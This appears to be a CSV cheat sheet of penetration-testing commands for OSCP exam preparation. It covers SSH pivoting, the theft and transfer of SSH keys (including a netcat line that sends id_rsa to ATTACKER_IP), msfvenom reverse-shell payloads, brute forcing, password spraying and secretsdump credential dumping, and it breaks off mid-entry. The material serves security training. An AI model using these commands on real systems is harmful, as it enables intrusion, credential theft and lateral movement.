"ssh-version","SSH Version Check","pivoting","ssh -V","Display OpenSSH client version - check compatibility for remote dynamic forwarding (requires ≥7.6)","ssh-tunneling","Critical check before using ssh-remote-dynamic-port-forward.

OpenSSH 7.6+ required for reverse SOCKS proxy.

Windows 1803+ includes OpenSSH 8.1+.

Most modern Linux has 7.6+.","medium"
"ssh-debug-verbose","SSH Verbose Debugging","pivoting","ssh -vvv <SSH_USER>@<SSH_HOST>","SSH connection with maximum verbosity - troubleshoot authentication, key exchange, and tunnel issues","ssh-tunneling","Use when SSH tunnels fail silently.

Verbose output shows:
key exchange, authentication attempts, tunnel establishment, connection forwarding.

Critical for diagnosing 'port forward works but connection hangs' scenarios.","medium"
"sshuttle-vpn","SSHuttle VPN over SSH","pivoting","sshuttle -r <SSH_USER>@<SSH_HOST> <SUBNET>/<CIDR> --dns","Create transparent VPN over SSH - route entire subnets through pivot without proxychains","ssh-tunneling","SSHuttle creates transparent proxy - tools work normally without proxychains prefix.

Advantage over SOCKS:
UDP support, transparent to applications, easier syntax.

Disadvantage:
Requires Python on pivot, modifies local routing table (iptables), less stealthy than SOCKS.

OSCP use case:
When proxychains causes issues with specific tools (e.g., Metasploit, Responder).

Time estimate:
2-3 minutes for setup, ~30 seconds per subnet route.","medium"
"ssh-connect-password","SSH Connect with Password","pivoting","ssh <USER>@<TARGET>","Connect to SSH server using password authentication for lateral movement or initial access","ssh","CRITICAL OSCP LATERAL MOVEMENT: Password reuse across services is common.

SSH password authentication workflow:
1. Enumerate SSH service: nmap -p 22 <TARGET>
2. Identify valid users: From /etc/passwd, web app, LDAP
3. Test credentials: From database dumps, config files, previous shells
4. Connect: ssh <USER>@<TARGET>
5. Upgrade shell: Usually not needed (SSH provides full PTY)
6. Enumerate: sudo -l, id, groups

Common OSCP scenarios:
(1) Database credentials work on SSH
    → Dump MySQL user table, test passwords

(2) Web application credentials work on SSH
    → Admin panel passwords often reused

(3) Credentials found in config files
    → .env, config.php, database.yml

(4) Default credentials
    → root:root, admin:admin, user:user

Manual verification before SSH:
# Verify SSH service running
nmap -p 22 -sV <TARGET>

# Check SSH banner for version
nc <TARGET> 22

# Verify user exists (if you have shell)
grep <USER> /etc/passwd

SSH flags for OSCP:
-p <PORT>  - Alternate SSH port
-v         - Verbose (debug connection issues)
-4         - Force IPv4 (avoid IPv6 issues)
-o StrictHostKeyChecking=no - Bypass host key verification (exam machines)
-o UserKnownHostsFile=/dev/null - Don't save host key

Password reuse attack vectors:
(1) Web app → SSH (most common)
(2) Database → SSH
(3) FTP → SSH
(4) SMB → SSH (Windows/Linux hybrid networks)
(5) User → Root (su with found password)

Alternatives:
sshpass -p 'password123' ssh user@target - Non-interactive password entry
hydra -l user -P passwords.txt ssh://target - Password spraying
medusa -h target -u user -P passwords.txt -M ssh - Alternative brute force

OSCP exam tip: ALWAYS test found credentials on SSH immediately. Document all credential pairs in credentials.txt. Common pattern: Web admin password = SSH user password.

Time estimate: 30 seconds (connection) + 0-5 minutes (troubleshooting)","high"
"ssh-key-authentication","SSH Connect with Private Key","pivoting","chmod 600 <KEY_FILE> && ssh -i <KEY_FILE> <USER>@<TARGET>","Connect to SSH server using private key authentication after extracting id_rsa from target system","ssh","HIGH-VALUE OSCP TECHNIQUE: SSH key theft for lateral movement.

SSH key authentication workflow:
1. Find private key on compromised system
   → Common locations: ~/.ssh/id_rsa, /home/*/.ssh/id_rsa, /root/.ssh/id_rsa

2. Extract key to attacker machine
   → Method 1: cat id_rsa (copy/paste)
   → Method 2: Base64 encode: base64 -w0 id_rsa (copy), base64 -d > id_rsa (paste)
   → Method 3: HTTP server: python3 -m http.server 8000, wget from attacker

3. Fix key format if needed (see ssh-key-format)
   → Check format: head -1 id_rsa
   → If ""BEGIN OPENSSH PRIVATE KEY"": Good, use directly
   → If ""BEGIN RSA PRIVATE KEY"": Good, use directly
   → If encrypted: Crack with ssh2john

4. Set correct permissions (CRITICAL)
   → chmod 600 id_rsa
   → SSH will refuse to use key with wrong permissions

5. Connect with key
   → ssh -i id_rsa <USER>@<TARGET>
   → Username often matches key owner: ls -l /home/*/.ssh/id_rsa

6. Enumerate privileges
   → sudo -l, id, groups

Common OSCP scenarios:
(1) Key found in web directory
    → /var/www/.ssh/id_rsa (web user)

(2) Key found in user home
    → /home/admin/.ssh/id_rsa (admin user)

(3) Key found in backup
    → /opt/backups/id_rsa, /tmp/id_rsa.bak

(4) Key in Git repository
    → .git/config, .git/ssh/, accidentally committed

(5) Multiple keys for different users
    → Test each key against all known users

Key permissions explained:
600 (rw-------) - Owner read/write only (REQUIRED for private keys)
644 (rw-r--r--) - Too permissive, SSH will reject
700 (rwx------) - Directory permissions for .ssh/

Finding SSH keys on target:
# Find all private keys
find / -name 'id_rsa' -o -name 'id_dsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' 2>/dev/null

# Find all .ssh directories
find / -type d -name '.ssh' 2>/dev/null

# Check current user's keys
ls -la ~/.ssh/

# Check all users' keys (if readable)
find /home -name 'id_*' 2>/dev/null

Testing key against multiple users:
for user in root admin user1 user2; do
  echo ""Testing $user""
  ssh -i id_rsa -o BatchMode=yes -o ConnectTimeout=5 $user@target && echo ""SUCCESS: $user"" && break
done

Advanced flags:
-o BatchMode=yes - Don't prompt for passphrase (fail if encrypted)
-o StrictHostKeyChecking=no - Bypass host key verification
-o UserKnownHostsFile=/dev/null - Don't save host key
-v - Verbose (debug authentication issues)

OSCP exam tip: ALWAYS check ~/.ssh/id_rsa immediately after gaining shell. If found, extract immediately. Test against all known users. Document in breakthrough.md if successful.

Time estimate: 1-2 minutes (key extraction) + 30 seconds (connection)","high"
"extract-ssh-key","Extract SSH Private Key","pivoting","cat ~/.ssh/id_rsa","Extract SSH private key from compromised system for lateral movement via key authentication","ssh","CRITICAL OSCP TECHNIQUE: SSH key theft enables passwordless lateral movement.

SSH private key locations (in order of likelihood):
(1) ~/.ssh/id_rsa - Current user's default RSA key
(2) ~/.ssh/id_ecdsa - Current user's ECDSA key (newer)
(3) ~/.ssh/id_ed25519 - Current user's Ed25519 key (newest)
(4) /home/<USER>/.ssh/id_rsa - Other users' keys (if readable)
(5) /root/.ssh/id_rsa - Root user's key (requires root access)
(6) /var/www/.ssh/id_rsa - Web user's key
(7) Backup locations: /tmp/id_rsa, /opt/backups/, .git/

Key extraction workflow:
1. Enumerate users: cat /etc/passwd | grep /bin/bash
2. Check current user's key: ls -la ~/.ssh/
3. Extract current user's key (THIS COMMAND)
4. Search for other users' keys:
   find /home -name 'id_rsa' -readable 2>/dev/null
5. Transfer key to attacker machine
6. Format key if needed (ssh-key-format)
7. Set permissions: chmod 600 id_rsa
8. Test key: ssh -i id_rsa <USER>@<TARGET>

Key format identification:
# RSA private key (older format, widely compatible)
-----BEGIN RSA PRIVATE KEY-----

# OpenSSH private key (newer format, OpenSSH 7.8+)
-----BEGIN OPENSSH PRIVATE KEY-----

# Encrypted private key (requires passphrase)
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,...

Key transfer methods:
Method 1: Copy/paste (small keys)
- Cat key on target, copy output
- Paste into file on attacker: nano id_rsa
- Set permissions: chmod 600 id_rsa

Method 2: Base64 encoding (cleaner, no formatting issues)
- On target: base64 -w0 ~/.ssh/id_rsa
- Copy base64 string
- On attacker: echo '<BASE64>' | base64 -d > id_rsa
- Set permissions: chmod 600 id_rsa

Method 3: HTTP server (large keys, multiple files)
- On target: cd ~/.ssh && python3 -m http.server 8000
- On attacker: wget http://target:8000/id_rsa
- Set permissions: chmod 600 id_rsa

Method 4: Netcat transfer
- On attacker: nc -lvnp 9001 > id_rsa
- On target: nc ATTACKER_IP 9001 < ~/.ssh/id_rsa
- Set permissions: chmod 600 id_rsa

Common OSCP scenarios:
(1) Web user has SSH key for database server
    → Pivot from web shell to database server

(2) User has SSH key for internal network
    → Lateral movement to internal machines

(3) Backup script contains SSH keys
    → /opt/backup.sh, /usr/local/bin/sync.sh

(4) Git repository with committed keys (mistake)
    → git log --all --full-history -- '*.ssh/*'

(5) Keys in world-readable locations (misconfiguration)
    → find / -name 'id_*' -perm -004 2>/dev/null

Public key verification:
Every private key has corresponding public key (.pub)
To verify key ownership:
1. Extract public key from private: ssh-keygen -y -f id_rsa
2. Compare with ~/.ssh/id_rsa.pub on target
3. Check authorized_keys: cat ~/.ssh/authorized_keys (shows where key grants access)

Testing extracted key:
# Test key against user it was found under
ssh -i id_rsa <USER>@<TARGET>

# Test key against all enumerated users
for user in $(cat users.txt); do
  ssh -i id_rsa -o BatchMode=yes -o ConnectTimeout=5 $user@<TARGET> 2>/dev/null && echo ""SUCCESS: $user""
done

# Test key against multiple targets (key reuse)
for ip in $(cat targets.txt); do
  ssh -i id_rsa -o BatchMode=yes -o ConnectTimeout=5 <USER>@$ip 2>/dev/null && echo ""SUCCESS: $ip""
done

Advanced enumeration:
# Find all SSH-related files
find ~/.ssh -type f 2>/dev/null

# Check SSH config for key locations
cat ~/.ssh/config 2>/dev/null | grep IdentityFile

# Search bash history for SSH commands
cat ~/.bash_history | grep 'ssh\|scp\|id_rsa'

OSCP exam tip: Check for SSH keys IMMEDIATELY after shell upgrade. Priority locations: current user's ~/.ssh/, then /home/*/.ssh/. If found, extract and test against all known IPs/users. Document in breakthrough.md.

Time estimate: 1-2 minutes (search + extraction) + 30 seconds per transfer method","high"
"ssh-key-format","Convert SSH Key Format","pivoting","ssh-keygen -p -m PEM -f <KEY_FILE>","Convert SSH private key to PEM format for compatibility when key format causes authentication failures","ssh","SSH KEY FORMAT TROUBLESHOOTING: Modern OpenSSH keys may fail on older systems.

SSH key format evolution:
(1) PEM format (RFC 4716) - Older, widely compatible
    Header: -----BEGIN RSA PRIVATE KEY-----
    Used by: OpenSSH < 7.8, most tools
    Compatibility: Excellent

(2) OpenSSH format - Newer, better security
    Header: -----BEGIN OPENSSH PRIVATE KEY-----
    Used by: OpenSSH >= 7.8 (default since 2018)
    Compatibility: May fail on older systems

When format conversion needed:
(1) ""Load key: invalid format"" error during SSH
(2) Key extracted from newer OpenSSH system, using on older system
(3) Key needs to work with non-OpenSSH tools (PuTTY, WinSCP)
(4) Key format not recognized by ssh command

Format conversion workflow:
1. Extract key from target (extract-ssh-key)
2. Check format: head -1 id_rsa
3. If ""OPENSSH PRIVATE KEY"" and SSH fails:
   → Convert to PEM (THIS COMMAND)
4. If ""RSA PRIVATE KEY"":
   → Already PEM format, issue is elsewhere
5. Set correct permissions: chmod 600 id_rsa
6. Test: ssh -i id_rsa <USER>@<TARGET>

Command walkthrough:
ssh-keygen -p -m PEM -f id_rsa
1. Prompts: ""Enter old passphrase:"" - Press Enter (if no passphrase) or enter passphrase
2. Prompts: ""Enter new passphrase:"" - Press Enter (keep no passphrase) or set new one
3. Prompts: ""Enter same passphrase again:"" - Press Enter or confirm
4. Output: ""Your identification has been saved with the new passphrase""
5. Result: Key now in PEM format

Alternative methods:
Method 1: ssh-keygen with empty passphrase
ssh-keygen -p -N '' -m pem -f id_rsa
→ No prompts, sets empty passphrase automatically

Method 2: OpenSSL conversion
openssl rsa -in id_rsa -out id_rsa.pem
→ Uses OpenSSL instead of ssh-keygen
→ May handle corrupted keys better

Method 3: PuTTYgen (Windows)
puttygen id_rsa -O private-openssh -o id_rsa.pem
→ For converting to PuTTY format (PPK) or vice versa

Verifying key format after conversion:
# Check header
head -1 id_rsa
# Should show: -----BEGIN RSA PRIVATE KEY-----

# Verify key is valid
ssh-keygen -y -f id_rsa
# Should output public key without errors

# Test authentication
ssh -v -i id_rsa <USER>@<TARGET>
# Verbose mode shows authentication details

Common OSCP scenarios:
(1) Key extracted from Ubuntu 20.04+ (OpenSSH 8.x)
    → Kali uses older OpenSSH version
    → Conversion needed

(2) Key from Windows OpenSSH
    → May be in different format
    → Convert to PEM for Linux compatibility

(3) Key works on target, fails on Kali
    → Format mismatch between SSH versions
    → Convert to universal PEM format

Remove passphrase from encrypted key:
# If you have the passphrase
ssh-keygen -p -N '' -f id_rsa
→ Enter old passphrase when prompted
→ Press Enter for new passphrase (empty)
→ Key now usable without passphrase

# If you don't have passphrase
ssh2john id_rsa > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
→ Crack passphrase with John the Ripper
→ Then remove passphrase with above command

OSCP exam tip: If extracted SSH key fails with ""invalid format"", immediately try format conversion. Pre-practice: ssh-keygen -p -m PEM -f id_rsa. Keep this command in your notes. Usually not needed but critical when it is.

Time estimate: 30 seconds (conversion) + 0-5 minutes (troubleshooting)","medium"
"proxychains-config","Configure Proxychains","pivoting","echo 'socks5 <BIND_ADDRESS> <SOCKS_PORT>' >> /etc/proxychains4.conf","Configure proxychains4.conf to route traffic through SOCKS proxy - required before using proxychains","proxychains","Critical configuration step for SSH dynamic forwarding.

Default config uses Tor (socks4 127.0.0.1 9050) - must replace with your SOCKS proxy.

Recommended settings for OSCP:
tcp_read_time_out = 1000, tcp_connect_time_out = 1000, proxy_dns enabled.

Chain types:
strict_chain (all proxies must work), dynamic_chain (skip dead proxies), random_chain (randomize order).

For exam:
Use strict_chain with single SOCKS proxy.

Alternative:
Create ~/.proxychains/proxychains.conf for user-specific config without sudo.","high"
"proxychains-nmap","Nmap Through Proxychains","pivoting","proxychains -q nmap -sT -Pn --top-ports=<TOP_PORTS> -v <TARGET>","Port scan through SOCKS proxy using proxychains - enumerate internal networks via pivot","proxychains","Critical OSCP technique for internal network enumeration through pivot.

Limitations:
TCP-only (no UDP/ICMP), must use -sT (connect scan, not SYN scan), no OS detection (-O), slower than direct scanning.

Performance tuning:
Reduce proxychains timeouts to 1000ms, use --top-ports=20 instead of -p-, add -T2 or -T3 timing.

For full subnet scans, consider parallel execution:
for ip in {1..254}; do proxychains -q nmap -sT -Pn --top-ports=20 172.16.50.$ip & done.

Time estimate:
1-2 minutes per host with top 20 ports.","high"
"proxychains-psql","PostgreSQL Through Proxychains","pivoting","proxychains -q psql -h <TARGET> -p <PORT> -U <USERNAME> -d <DATABASE>","Connect to internal PostgreSQL database through SOCKS proxy using proxychains","proxychains","Common OSCP scenario:
Find PostgreSQL credentials in config files (e.g., confluence.cfg.xml), access internal database through pivot.

Alternative to port forwarding when you want interactive session without permanent tunnel.

For non-interactive queries, use:
echo 'SELECT * FROM users;' | proxychains psql -h <TARGET> -U <USER> -d <DB>.

Time estimate:
1-2 minutes for connection and query.","medium"
"rustscan-fast-scan","Rustscan - Fast Port Scanner","recon","rustscan -a <TARGET> -- -sV -sC","Ultra-fast SYN scanner that feeds open ports to nmap","port-scanning","",""
"masscan-fast-scan","Masscan - Fast Network Scanner","recon","masscan -p1-65535 <TARGET> --rate=1000","Fastest internet-scale port scanner","port-scanning","",""
"autorecon-full","AutoRecon - Automated Enumeration","recon","autorecon <TARGET> -o <OUTPUT_DIR>","Multi-threaded network reconnaissance tool that automates enumeration","automated","",""
"enum4linux-smb","Enum4Linux - SMB Enumeration","recon","enum4linux -a <TARGET>","Tool for enumerating information from Windows and Samba systems","smb","",""
"enum4linux-ng","Enum4Linux-ng - Modern SMB Enumeration","recon","enum4linux-ng -A <TARGET>","Next generation enum4linux with more features and better output","smb","",""
"whatweb-scan","WhatWeb - Web Technology Scanner","recon","whatweb -v <URL>","Identifies websites technologies, CMS, plugins, versions","web","",""
"ldapsearch-basic","LDAP Search - Basic Enumeration","recon","ldapsearch -x -H ldap://<TARGET> -b '<BASE_DN>'","Query LDAP directory for users and objects","ldap","",""
"ldapsearch-dump","LDAP Search - Full Dump","recon","ldapsearch -x -H ldap://<TARGET> -b '<BASE_DN>' -D '<USER>' -w '<PASS>' '*'","Dump all LDAP directory information","ldap","",""
"dig-domain-enum","Dig - Domain Enumeration","recon","dig <DOMAIN> ANY","DNS lookup utility for domain reconnaissance","dns","",""
"dig-zone-transfer","Dig - DNS Zone Transfer","recon","dig axfr @<NAMESERVER> <DOMAIN>","Attempt AXFR zone transfer to dump all DNS records","dns","",""
"dnsenum-domain","DNSenum - Domain Enumeration","recon","dnsenum <DOMAIN>","Comprehensive DNS enumeration tool","dns","",""
"dnsrecon-domain","DNSRecon - DNS Reconnaissance","recon","dnsrecon -d <DOMAIN> -t std","DNS enumeration and network mapping","dns","",""
"suid-find","SUID - Find Binaries","privilege-escalation","find / -perm -u=s -type f 2>/dev/null","Find SUID/SGID binaries for privilege escalation","linux","",""
"suid-exploit","SUID - Exploit Binary","privilege-escalation","<SUID_BINARY>","Exploit SUID binary for privilege escalation","linux","",""
"cap-find","Capabilities - Find Binaries","privilege-escalation","getcap -r / 2>/dev/null","Find binaries with Linux capabilities","linux","",""
"cap-exploit","Capabilities - Exploit Binary","privilege-escalation","<CAP_BINARY>","Exploit capability-enabled binary for privesc","linux","",""
"cron-enum","Cronjobs - Enumerate","privilege-escalation","cat /etc/crontab","Find scheduled cronjobs for privilege escalation","linux","",""
"kernel-exploit-search","Kernel Exploit - Search","privilege-escalation","uname -a","Search for kernel exploits","linux","",""
"gtfobins-lookup","GTFOBins - Lookup","privilege-escalation","# Visit https://gtfobins.github.io/","Lookup binary exploitation on GTFOBins","linux","",""
"lolbas-lookup","LOLBAS - Lookup","privilege-escalation","# Visit https://lolbas-project.github.io/","Lookup Windows binary exploitation on LOLBAS","windows","",""
"ffuf-dir-fuzz","Ffuf - Directory Fuzzing","web","ffuf -u http://<TARGET>/FUZZ -w <WORDLIST>","Fast web fuzzer for directory discovery","fuzzing","",""
"ffuf-vhost-fuzz","Ffuf - Virtual Host Discovery","web","ffuf -u http://<TARGET> -H 'Host: FUZZ.<DOMAIN>' -w <WORDLIST>","Fuzz for virtual hosts on a target","fuzzing","",""
"ffuf-param-fuzz","Ffuf - Parameter Fuzzing","web","ffuf -u 'http://<TARGET>/<PATH>?FUZZ=test' -w <WORDLIST>","Discover hidden GET/POST parameters","fuzzing","",""
"curl-get","Curl - HTTP GET Request","web","curl <URL>","Make HTTP GET request to URL","http-client","",""
"curl-headers","Curl - View HTTP Headers","web","curl -I <URL>","Display only HTTP response headers","http-client","",""
"gobuster-dir-basic","Gobuster - Directory Enumeration","web","gobuster dir -u http://<TARGET> -w <WORDLIST>","Fast directory/file brute-forcing tool","directory-enumeration","",""
"wfuzz-dir","Wfuzz - Directory Fuzzing","web","wfuzz -w <WORDLIST> --hc 404 http://<TARGET>/FUZZ","Web application fuzzer for directories","fuzzing","",""
"wfuzz-param","Wfuzz - Parameter Fuzzing","web","wfuzz -w <WORDLIST> --hh 0 http://<TARGET>/?FUZZ=test","Fuzz for hidden parameters","fuzzing","",""
"nikto-web-scan","Nikto - Web Vulnerability Scanner","web","nikto -h http://<TARGET>","Scan web server for vulnerabilities","vulnerability-scanning","",""
"wpscan-enumerate","WPScan - WordPress Scanner","web","wpscan --url http://<TARGET> --enumerate u,p,t","Enumerate WordPress installation","cms-enumeration","",""
"joomscan-enumerate","Joomscan - Joomla Scanner","web","joomscan -u http://<TARGET>","Enumerate Joomla installation","cms-enumeration","",""
"droopescan-enumerate","Droopescan - CMS Scanner","web","droopescan scan <CMS> -u http://<TARGET>","Scanner for Drupal, Joomla, Wordpress, Silverstripe","cms-enumeration","",""
"wget-recursive","Wget - Recursive Download","web","wget -r -np -nH --cut-dirs=1 http://<TARGET>/","Recursively download website","web-scraping","",""
"sqlmap-advanced","SQLMap - SQL Injection Testing","web","sqlmap -u '<URL>' -p <PARAM> --batch","Automated SQL injection detection and exploitation","sql-injection","",""
"php-http-server","PHP - Simple HTTP Server","file-transfer","php -S 0.0.0.0:<PORT>","Start simple HTTP server using PHP","http-server","",""
"ruby-http-server","Ruby - Simple HTTP Server","file-transfer","ruby -run -ehttpd . -p<PORT>","Start simple HTTP server using Ruby","http-server","",""
"scp-upload","SCP - Upload File","file-transfer","scp <LOCAL_FILE> <USER>@<TARGET>:<REMOTE_PATH>","Upload file to remote host via SCP","scp","",""
"scp-download","SCP - Download File","file-transfer","scp <USER>@<TARGET>:<REMOTE_FILE> <LOCAL_PATH>","Download file from remote host via SCP","scp","",""
"tftp-upload","TFTP - Upload File","file-transfer","tftp -i <TARGET> PUT <LOCAL_FILE>","Upload file via TFTP (common on Windows)","tftp","",""
"impacket-smbserver","Impacket SMB Server","file-transfer","impacket-smbserver <SHARE_NAME> <DIRECTORY> -smb2support","Start temporary SMB server for file transfer","smb","",""
"bitsadmin-download","Bitsadmin - Download File","file-transfer","bitsadmin /transfer myDownload /download /priority high http://<LHOST>/<FILE> <DEST>","Download file on Windows using bitsadmin","windows","",""
"powershell-wget","PowerShell - Download File (wget)","file-transfer","powershell wget http://<LHOST>/<FILE> -OutFile <DEST>","Download file using PowerShell wget alias","windows","",""
"powershell-invoke-webrequest","PowerShell - Invoke-WebRequest","file-transfer","powershell -c ""Invoke-WebRequest -Uri 'http://<LHOST>/<FILE>' -OutFile '<DEST>'""","Download file using PowerShell Invoke-WebRequest","windows","",""
"chisel-server","Chisel - Server Mode","tunneling","chisel server -p <PORT> --reverse","Start Chisel server for reverse tunneling","port-forwarding","",""
"chisel-client","Chisel - Client Mode","tunneling","chisel client <SERVER_IP>:<PORT> R:<LPORT>:<TARGET>:<RPORT>","Connect Chisel client for tunneling","port-forwarding","",""
"chisel-socks","Chisel - SOCKS Proxy","tunneling","chisel client <SERVER_IP>:<PORT> R:socks","Create SOCKS proxy through Chisel","socks-proxy","",""
"ssh-local-forward","SSH - Local Port Forwarding","tunneling","ssh -L <LPORT>:<TARGET>:<RPORT> <USER>@<SSH_HOST>","Forward local port through SSH tunnel","ssh-tunneling","",""
"ssh-remote-forward","SSH - Remote Port Forwarding","tunneling","ssh -R <RPORT>:localhost:<LPORT> <USER>@<SSH_HOST>","Forward remote port back to attacker","ssh-tunneling","",""
"ssh-dynamic-forward","SSH - Dynamic Port Forwarding (SOCKS)","tunneling","ssh -D <LPORT> <USER>@<SSH_HOST>","Create SOCKS proxy through SSH","ssh-tunneling","",""
"ligolo-server","Ligolo-ng - Server","tunneling","ligolo-ng -selfcert","Start Ligolo-ng server for pivoting","pivoting","",""
"ligolo-agent","Ligolo-ng - Agent","tunneling","ligolo-agent -connect <SERVER_IP>:11601 -ignore-cert","Connect Ligolo-ng agent to server","pivoting","",""
"msfvenom-linux-shell","Msfvenom - Linux Reverse Shell","exploitation","msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o shell.elf","Generate Linux x64 reverse shell payload","payload-generation","",""
"msfvenom-windows-shell","Msfvenom - Windows Reverse Shell","exploitation","msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o shell.exe","Generate Windows x64 reverse shell executable","payload-generation","",""
"msfvenom-staged","Msfvenom - Staged Payload","exploitation","msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o staged.elf","Generate staged payload for constrained environments","payload-generation","",""
"searchsploit-search","Searchsploit - Search Exploits","exploitation","searchsploit <SEARCH_TERM>","Search exploit-db for vulnerabilities","exploit-research","",""
"searchsploit-update","Searchsploit - Update Database","exploitation","searchsploit -u","Update local exploit-db repository","exploit-research","",""
"nc-bind-shell","Netcat - Bind Shell","exploitation","nc <TARGET> <RPORT>","Connect to bind shell on target","shells","",""
"socat-listener","Socat - Enhanced Listener","exploitation","socat file:`tty`,raw,echo=0 tcp-listen:<LPORT>","Start socat listener with PTY support","listeners","",""
"socat-file-transfer","Socat - File Transfer","exploitation","socat TCP4-LISTEN:<LPORT>,fork file:<FILENAME>","Transfer files using socat","file-transfer","",""
"msfconsole-search","Metasploit - Search Modules","exploitation","msfconsole -q -x 'search <SEARCH_TERM>; exit'","Search for exploit modules in Metasploit","metasploit","",""
"msfconsole-exploit","Metasploit - Run Exploit","exploitation","msfconsole -q -x 'use <MODULE>; set RHOSTS <TARGET>; set LHOST <LHOST>; run'","Execute exploit module with handler","metasploit","",""
"linpeas-run","LinPEAS - Linux Privilege Escalation","post-exploitation","./linpeas.sh","Automated Linux privilege escalation enumeration","enumeration-linux","",""
"linenum-run","LinEnum - Linux Enumeration","post-exploitation","./LinEnum.sh -t","Linux enumeration script for privilege escalation","enumeration-linux","",""
"les-run","Linux Exploit Suggester","post-exploitation","./linux-exploit-suggester.sh","Suggest kernel exploits for privilege escalation","enumeration-linux","",""
"pspy-monitor","Pspy - Process Monitor","post-exploitation","./pspy64","Monitor Linux processes without root (detect cronjobs)","enumeration-linux","",""
"winpeas-run","WinPEAS - Windows Privilege Escalation","post-exploitation","winpeas.exe","Automated Windows privilege escalation enumeration","enumeration-windows","",""
"wes-run","Windows Exploit Suggester","post-exploitation","python windows-exploit-suggester.py --database <DB> --systeminfo <FILE>","Suggest Windows exploits based on systeminfo","enumeration-windows","",""
"powerup-run","PowerUp - Windows Privesc Check","post-exploitation","powershell -ep bypass -c '. .\PowerUp.ps1; Invoke-AllChecks'","PowerShell script for Windows privilege escalation checks","enumeration-windows","",""
"privesccheck-run","PrivescCheck - Windows Enumeration","post-exploitation","powershell -ep bypass -c '. .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended'","Comprehensive Windows privilege escalation checks","enumeration-windows","",""
"seatbelt-run","Seatbelt - Windows Host Survey","post-exploitation","Seatbelt.exe -group=all","C# tool for Windows security posture assessment","enumeration-windows","",""
"sharphound-collect","SharpHound - AD Data Collection","post-exploitation","SharpHound.exe -c All","Collect Active Directory data for BloodHound analysis","active-directory","",""
"bloodhound-analyze","BloodHound - AD Path Analysis","post-exploitation","neo4j console","Analyze Active Directory attack paths","active-directory","",""
"hydra-ftp","Hydra - FTP Brute Force","password-attacks","hydra -L <USERLIST> -P <PASSLIST> ftp://<TARGET>","Brute force FTP credentials","brute-force","",""
"hydra-http","Hydra - HTTP POST Brute Force","password-attacks","hydra -l <USER> -P <PASSLIST> <TARGET> http-post-form '<PATH>:<PARAMS>:<FAIL_STRING>'","Brute force HTTP login forms","brute-force","",""
"medusa-ssh","Medusa - SSH Brute Force","password-attacks","medusa -h <TARGET> -U <USERLIST> -P <PASSLIST> -M ssh","Brute force SSH credentials","brute-force","",""
"medusa-smb","Medusa - SMB Brute Force","password-attacks","medusa -h <TARGET> -U <USERLIST> -P <PASSLIST> -M smbnt","Brute force SMB credentials","brute-force","",""
"cme-smb","CrackMapExec - SMB Brute Force","password-attacks","crackmapexec smb <TARGET> -u <USER> -p <PASS>","Brute force and spray SMB credentials","credential-spraying","",""
"cme-winrm","CrackMapExec - WinRM Brute Force","password-attacks","crackmapexec winrm <TARGET> -u <USER> -p <PASS>","Brute force WinRM credentials","credential-spraying","",""
"cme-ssh","CrackMapExec - SSH Brute Force","password-attacks","crackmapexec ssh <TARGET> -u <USER> -p <PASS>","Brute force SSH credentials","credential-spraying","",""
"john-crack","John - Crack Password Hashes","password-attacks","john --wordlist=<WORDLIST> <HASHFILE>","Crack password hashes with John the Ripper","hash-cracking","",""
"john-format","John - Format Hash File","password-attacks","<TOOL>2john <FILE> > <HASHFILE>","Convert hash to John format","hash-cracking","",""
"hashcat-crack","Hashcat - Crack Hashes","password-attacks","hashcat -m <MODE> -a 0 <HASHFILE> <WORDLIST>","GPU-accelerated hash cracking","hash-cracking","",""
"hashcat-modes","Hashcat - List Hash Modes","password-attacks","hashcat --help | grep -i <HASH_TYPE>","Display supported hash types","hash-cracking","",""
"hashid-identify","Hashid - Identify Hash Type","password-attacks","hashid <HASH>","Identify hash type for cracking","hash-identification","",""
"hash-identifier-run","Hash Identifier - Interactive","password-attacks","hash-identifier","Interactive hash type identification","hash-identification","",""
"kerbrute-userenum","Kerbrute - User Enumeration","password-attacks","kerbrute userenum -d <DOMAIN> --dc <DC_IP> <USERLIST>","Enumerate valid Active Directory users via Kerberos","active-directory","",""
"kerbrute-bruteuser","Kerbrute - Password Spray","password-attacks","kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> <USERLIST> <PASSWORD>","Password spray against Active Directory users","active-directory","",""
"bloodhound-ingest","BloodHound - Ingest Data","active-directory","# Import via BloodHound GUI: Upload Data button","Import SharpHound data to BloodHound","enumeration","",""
"bloodhound-query","BloodHound - Query Paths","active-directory","# Run query: 'Shortest Paths to Domain Admins'","Query attack paths in BloodHound","enumeration","",""
"cme-smb-users","CrackMapExec - Enumerate Users","active-directory","crackmapexec smb <TARGET> -u <USER> -p <PASS> --users","Enumerate domain users via SMB","enumeration","",""
"psexec-shell","Impacket PSExec - Remote Shell","active-directory","impacket-psexec <DOMAIN>/<USER>:<PASS>@<TARGET>","Execute commands remotely via PSExec","lateral-movement","",""
"smbexec-shell","Impacket SMBExec - Remote Shell","active-directory","impacket-smbexec <DOMAIN>/<USER>:<PASS>@<TARGET>","Execute commands via SMB (fileless)","lateral-movement","",""
"wmiexec-shell","Impacket WMIExec - Remote Shell","active-directory","impacket-wmiexec <DOMAIN>/<USER>:<PASS>@<TARGET>","Execute commands via WMI (semi-interactive)","lateral-movement","",""
"secretsdump-hashes","Impacket SecretsDump - DCSync and Credential Dumping","active-directory","impacket-secretsdump '<DOMAIN>/<USER>:<PASS>@<TARGET>'","Comprehensive credential dumping tool supporting DCSync (DRSUAPI replication), SAM/LSA dumping, and NTDS.dit extraction. Primary method for domain credential harvesting from Kali Linux.","credential-dumping","OSCP METHODOLOGY - COMPREHENSIVE CREDENTIAL DUMPING WITH SECRETSDUMP:
impacket-secretsdump is the SWISS ARMY KNIFE of credential dumping from Linux.

It supports MULTIPLE dumping methods, each with different requirements and use cases:
**DUMPING METHODS COMPARISON:**

1.

**DCSYNC (-just-dc, -just-dc-ntlm, -just-dc-user):**
   - PRIVILEGE:
Domain Admin, Enterprise Admin, or replication rights
   - TARGET:
Domain Controller (remotely via DRSUAPI)
   - ACCESS:
Remote (no DC access needed)
   - OUTPUT:
